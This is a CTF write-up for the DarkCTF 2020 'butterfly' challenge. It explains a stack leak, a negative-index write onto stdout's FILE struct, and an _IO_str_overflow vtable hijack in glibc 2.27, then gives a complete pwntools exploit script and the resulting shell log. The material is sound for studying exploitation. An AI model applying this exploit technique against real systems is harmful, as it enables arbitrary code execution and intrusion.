# Table of Contents
1. [Author](#Author)
2. [CTF](#CTF)
3. [Category](#Category)
4. [Challenge Name](#Challenge-Name)
5. [Challenge Points](#Challenge-Points)
6. [Attachments](#Attachments)
7. [Challenge Description](#Challenge-Description)
8. [Solution](#Solution)

# Author
0x534b aka m0n0

# CTF
DarkCTF 2020

# Category
Pwn

# Challenge Name
butterfly

# Challenge Points
482 pts

# Challenge Description
get RIP control

`nc pwn.darkarmy.xyz 32770`

# Attachments
## distribute.zip
A `zip` file with everything you need to set up a `docker` container to test your exploit on.
```
Mode           Length Name
----           ------ ----
da----                challenge_bin
da----                extras
da----                libc
da----                source
-a----            348 Dockerfile
```
## Challenge Binaries
### butterfly
```
butterfly: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=eb078f4dcf5fa8f3c8bb13753f6bce85a8ad29c6, stripped
```
### butterfly.c
Presumably the source code for the `butterfly` binary:
```c
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<fcntl.h>
#include<unistd.h>

#define HK 0x1337

char *note[0x2];

long int getnum()
{
	char buffer[0x20];
	read(0,buffer,0x18);
	return atoll(buffer); // convert to long int
}
void setup()
{
	setvbuf(stdin,0,2,0);
	setvbuf(stdout,0,2,0);
	setvbuf(stderr,0,2,0);
	alarm(20);
}

void handler()
{
	char buffer[0x100];
	long int idx;
	note[0] = (char *)malloc(0x200);
	note[1] = (char *)malloc(0x200);
	printf("I need your name: ");
	read(0,buffer,0x50);
	puts(buffer);
	printf("Enter the index of the you want to write: ");
	idx = getnum();
	if(idx < 2) {
		printf("Enter data: ");
		read(0,note[idx],0xe8);
	}
	puts("Bye");
	_exit(HK);
}
int main()
{
	setup();
	handler();
	return 0;
}
```
### libc.so.6
GLibc version 2.27 for Ubuntu 18.04.
```
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.
Copyright (C) 2018 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 7.5.0.
libc ABIs: UNIQUE IFUNC
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
```

# Solution
First, let's try running `butterfly`:
```
I need your name: hello
hello

Enter the index of the you want to write: 5
Bye
```
It looks like it takes a name, echos it back, then asks for "the index of the you want to write." After trying a few different inputs we can get something like this:
```
I need your name:

�S��
Enter the index of the you want to write: 0
Enter data: AAAA
Bye
```
Huh, looks like if you leave the name blank, it leaks something from memory. Also, possibly our index of 5 from before was invalid, but zero isn't, so it asks for data. Taking a look at the source code we can see that the program first sets all io streams to be unbuffered and sets a 20 second timer:
```c
setvbuf(stdin,0,2,0);
setvbuf(stdout,0,2,0);
setvbuf(stderr,0,2,0);
alarm(20);
```
Next, it allocates a couple chunks of memory from the heap and stores their addresses in the global `note` array:
```c
note[0] = (char *)malloc(0x200);
note[1] = (char *)malloc(0x200);
```
It then asks for a name, reads it into a buffer on the stack, and uses `puts` to print it back to us. This explains the address we leaked earlier, because this buffer is not zeroed out before it reads our input:
```c
printf("I need your name: ");
read(0,buffer,0x50);
puts(buffer);
```
After that, it prompts for an index for which `note` to write to. Notice that it uses this custom `getnum` function we'll take a closer look at in a minute:
```c
printf("Enter the index of the you want to write: ");
idx = getnum();
```
Then it checks if that number is less than 2 (the length of the `note` array). This explains why the contents of the `if` statement were skipped when we used the number 5. In the `if` statement, the program reads some user input into the heap memory at the address at the selected index of `note`:
```c
if(idx < 2) {
    printf("Enter data: ");
    read(0,note[idx],0xe8);
}
```
Finally, it `puts` the string "Bye" and calls `_exit` to end the program (without returning):
```c
puts("Bye");
_exit(HK);
```
So what vulnerabilities to we have to work with here? The first is that stack leak we noticed earlier. We can get a bit more control over what gets leaked by filling `buffer` right op to whichever address we want to leak. We don't have a stack overflow because the program always reads less than the length of the buffer, and even if we did the `handler` function doesn't even return, and `checksec` reveals a stack canary:
```
[*] '/ctf/Pwn/butterfly/try/butterfly'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
In fact, it looks like all protections are enabled :/ \
Hmm... let's take a closer lood at that `getnum` function from earlier:
```c
long int getnum()
{
	char buffer[0x20];
	read(0,buffer,0x18);
	return atoll(buffer);
}
```
Aha! it uses the `atoll` function to parse our input as a *signed* `long`, meaning we could give it a negative number to go back past the beginning of the `note` array in memory! \
Since `note` is a global variable, it is loaded into memory at a static offset from the base of the binary (which will move around thanks to PIE). So, we can write to anywhere that the executable contains a pointer to. Taking a look in `ghidra`, we can see that those io `FILE *`s from earlier are actually right behind the global array in memory, at these offsets:
```
0x202020 stdout
0x202028
0x202030 stdin
0x202038
0x202040 stderr
0x202048
0x202050 note[0]
0x202058 note[1]
```
We also know from reading the source code that the only thing that really happens after we write into memory (before the program `_exit`s) is a call to `puts`, which is another clue that the exploit will involve `stdout`. \
By tracing through the `puts` function in `gdb`, we can see it loads `stdout`'s `FILE *` into the `RDI` register:
```
0x7ffff7a64aa7 <puts+119>    mov    rdi, qword ptr [rip + 0x36bd9a] <0x7ffff7dd0848>
```
Next, it loads an offset from `RDI` into the `R13` register:
```
0x7ffff7a64ace <puts+158>    mov    r13, qword ptr [rdi + 0xd8] <0x7ffff7dd0838>
```
Then, it calls the address at an offset from `R13`:
```
0x7ffff7a64afb <puts+203>    call   qword ptr [r13 + 0x38] <_IO_file_xsputn>
    rdi: 0x7ffff7dd0760 (_IO_2_1_stdout_) ◂— 0xfbad2887
    rsi: 0x7fffffffe3c0 ◂— 0xa6f6c6c6568 /* 'hello\n' */
    rdx: 0x6
    rcx: 0xb40
```
Wait a minute, if we can write to `stdout`'s `FILE` struct, we can change the value of what ends up at an offset from `RDI` to directly control the value of `R13`!

Well, there is a limitation to this. At `<puts+188>`, libc checks that `R13` points somewhere inside `_IO_helper_jumps`, a struct of jump tables full of pointers to helper functions for io operations.

However, after some research (check out [this article](https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/#:~:text='FILE'%20structure%20exploitation%20is%20one,his%2Fher%20own%20forged%20structure.)), I found that at least one of these functions is exploitable if we call it, `_IO_str_overflow`. Here's the source code:
```c
int _IO_str_overflow (_IO_FILE *fp, int c)
{
    int flush_only = c == EOF;
    _IO_size_t pos;

    if (fp->_flags & _IO_NO_WRITES)
        return flush_only ? 0 : EOF;

    if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
    {
        fp->_flags |= _IO_CURRENTLY_PUTTING;
        fp->_IO_write_ptr = fp->_IO_read_ptr;
        fp->_IO_read_ptr = fp->_IO_read_end;
    }

    pos = fp->_IO_write_ptr - fp->_IO_write_base;

    if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
    {
        if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
            return EOF;

        else
        {
            char *new_buf;
            char *old_buf = fp->_IO_buf_base;
            size_t old_blen = _IO_blen (fp);
            _IO_size_t new_size = 2 * old_blen + 100;

            if (new_size < old_blen)
                return EOF;

            new_buf = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);

            if (new_buf == NULL)
            {
                /*	  __ferror(fp) = 1; */
                return EOF;
            }

            if (old_buf)
            {
                memcpy (new_buf, old_buf, old_blen);
                (*((_IO_strfile *) fp)->_s._free_buffer) (old_buf);
                /* Make sure _IO_setb won't try to delete _IO_buf_base. */
                fp->_IO_buf_base = NULL;
            }

            memset (new_buf + old_blen, '\0', new_size - old_blen);

            _IO_setb (fp, new_buf, new_buf + new_size, 1);
            fp->_IO_read_base = new_buf + (fp->_IO_read_base - old_buf);
            fp->_IO_read_ptr = new_buf + (fp->_IO_read_ptr - old_buf);
            fp->_IO_read_end = new_buf + (fp->_IO_read_end - old_buf);
            fp->_IO_write_ptr = new_buf + (fp->_IO_write_ptr - old_buf);

            fp->_IO_write_base = new_buf;
            fp->_IO_write_end = fp->_IO_buf_end;
        }
    }

    if (!flush_only)
        *fp->_IO_write_ptr++ = (unsigned char) c;

    if (fp->_IO_write_ptr > fp->_IO_read_end)
        fp->_IO_read_end = fp->_IO_write_ptr;

    return c;
}
```

Libc source code can be a bit daunting but now we can see the light at the end of the tunnel, a call to an offset from our `FILE *` (`fp`) with no integrity checks:
```c
new_buf = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
```

We just need to get through a few conditions to get there. First, we need to avoid this `if` statement:
```c
if (fp->_flags & _IO_NO_WRITES)
    return flush_only ? 0 : EOF;
```

The `_IO_NO_WRITES` macro expands to 8, and `fp->_flags` is just the first 4 bytes at `fp`, which before any tampering were `0xfbad2887`. `0xfbad2887 & 0x8` evaluates to zero, so we already pass this test. We're also already dodging this one:
```c
if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
```

Next, we want to get into this `if` statement:
```c
pos = fp->_IO_write_ptr - fp->_IO_write_base;
if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
```

`fp->_IO_write_ptr` is at `fp+0x50`, `fp->_IO_write_base` is at `fp+0x40`, and `_IO_blen(fp)` expands to `fp->_IO_buf_end - fp->_IO_buf_base` which are at `fp+0x80` and `fp+0x70` respectively. It looks like `flush_only` is just set to 1 or 0 based on a check at the beginning of the function. So, all we have to do here is make sure that the difference between `_IO_write_ptr` and `_IO_write_base` is at least 1 larger than the difference between `_IO_buf_end` and `_IO_buf_base`. \
Not so bad so far, 2 more to go:
```c
if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
	return EOF;
```

The `_IO_USER_BUF` macro expands to 1, so we just need to make `_flags` even. We have to be careful here not to change `_flags` in a way that gets us caught up in the first 2 tests. Now for the last check:
```c
size_t old_blen = _IO_blen (fp);
_IO_size_t new_size = 2 * old_blen + 100;

if (new_size < old_blen)
    return EOF;
```

For this one we have to keep the difference between `_IO_buf_end` and `_IO_buf_base` small enough that multiplying it by 2 and adding 100 doesn't cause an overflow resulting in a lower number. Finally, the function call:
```c
new_buf = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
```

`fp->_s._allocate_buffer` is at `fp+0xe0` so that's where we need to put our address to jump to. Using the leak from our first input we can get our hands on a libc address and use its offset to calculate the address of a `one_gadget`, which we can put into `fp->_s._allocate_buffer` to jump to it.

Here's my final exploit:
```python
#!/usr/bin/env python3

# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./butterfly
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./butterfly')
libc = ELF('./libc.so.6')
host = 'pwn.darkarmy.xyz'
port = 32770

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

def local(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        p = process([exe.path] + argv, *a, **kw)
        input() # give me time to attach a debugger
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(host, port)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

note_offset = 0x202050

io = start()

io.recv() # "I need your name: "

pl = b'A'*(0x50-1) # fill the buffer up to a libc address (-1 for newline char)
io.sendline(pl)

io.recvuntil(b'\n') # "AAAAA...AAAAA\n"

res = io.recvuntil(b'\n') # "0x7f...\n"
leak = u64(res[:-1].ljust(8, b'\x00'))
libc.address = leak - 0x1b39e7

print(f'libc at: {hex(libc.address)}')

io.recv() # "Enter the index of the you want to write: "

gadget = libc.address + 0x10a45c # [rsp+0x70 == NULL] one_gadget
io_str_overflow = libc.address + 0x3e8378 # _IO_str_overflow ptr in _IO_str_jumps vtable

pl = str(-6) # -(note_offset - stdout) / 8
io.sendline(pl)

io.recv() # "Enter data: "

pl = b''

pl += p64(0x00000000fbad2886) # _flags: set the _flags lsb to 0 to allow enlargement

pl += p64(libc.address + 0x3ec7e3)*3

pl += p64(libc.address + 0x3ec7e3) # _IO_write_base
pl += p64(libc.address + 0x3ec7e3 + 2) # _IO_write_ptr
pl += p64(libc.address + 0x3ec7e3) # _IO_write_end
pl += p64(libc.address + 0x3ec7e3) # _IO_buf_base
pl += p64(libc.address + 0x3ec7e3 + 1) # _IO_buf_end

pl += p64(0x0)*4
pl += p64(libc.address + 0x3eba00)
pl += p64(0x1)
pl += p64(0xffffffffffffffff)
pl += p64(0x000000000a000000)
pl += p64(libc.address + 0x3ed8c0)
pl += p64(0xffffffffffffffff)
pl += p64(0x0)
pl += p64(libc.address + 0x3eb8c0)
pl += p64(0x0)*3
pl += p64(0x00000000ffffffff)
pl += p64(0x0)*2

pl += p64(io_str_overflow - 0x38) # _IO_str_overflow minus the offset to _IO_new_file_xsputn (called in puts)
pl += p64(gadget) # _s._allocate_buffer (overwritten with address of one_gadget)

io.sendline(pl) # send the payload

io.interactive()
```

Let's run it!
```
[*] '/ctf/Pwn/butterfly/try/butterfly'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/ctf/Pwn/butterfly/try/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to pwn.darkarmy.xyz on port 32770: Done
libc at: 0x7f42db53d000
[*] Switching to interactive mode
$ ls
butterfly
flag
run.sh
ynetd
$ cat flag
darkCTF{https://www.youtube.com/watch?v=L2C8rVO2lAg}
```

Wait is that a [LiveOverflow video](https://www.youtube.com/watch?v=L2C8rVO2lAg)?
